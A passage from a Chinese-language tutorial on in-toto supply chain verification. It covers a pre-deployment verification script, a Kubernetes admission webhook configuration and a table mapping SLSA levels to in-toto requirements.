### 步骤 4：部署前验证

```bash
# 验证整个供应链
in-toto-verify --layout root.layout \
  --layout-key keys/owner.pub \
  --link-dir ./link-metadata/

# 验证通过后继续部署
if [ $? -eq 0 ]; then
  kubectl apply -f deployment.yaml
  echo "供应链验证通过 - 开始部署"
else
  echo "供应链验证失败 - 阻止部署"
  exit 1
fi
```

### 步骤 5：Kubernetes 准入控制

将策略引擎集成以在准入时验证证明：

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: in-toto-verifier
webhooks:
  - name: verify.in-toto.io
    rules:
      - apiGroups: ["apps"]
        resources: ["deployments"]
        operations: ["CREATE", "UPDATE"]
    clientConfig:
      service:
        name: in-toto-webhook
        namespace: security
        path: /verify
    failurePolicy: Fail
    sideEffects: None
    admissionReviewVersions: ["v1"]
```

## SLSA 集成

in-toto 证明直接映射到 SLSA（Supply chain Levels for Software Artifacts）要求：

| SLSA 等级 | in-toto 要求 |
|------------|-------------------|
| 等级 1 | 构建流程已记录（布局已存在） |
| 等级 2 | 来自托管构建服务的签名证明 |
| 等级 3 | 加固构建平台、不可伪造的来源证明 |
| 等级 4 | 双方审查、密封构建 |

## 参考资料

- [in-toto 官方网站](https://in-toto.io/)
- [in-toto GitHub 仓库](https://github.com/in-toto/in-toto)
- [CNCF in-toto 毕业公告](https://www.cncf.io/announcements/2025/04/23/cncf-announces-graduation-of-in-toto-security-framework-enhancing-software-supply-chain-integrity-across-industries/)
- [SLSA 框架](https://slsa.dev/)
- [Sigstore 集成](https://www.sigstore.dev/)
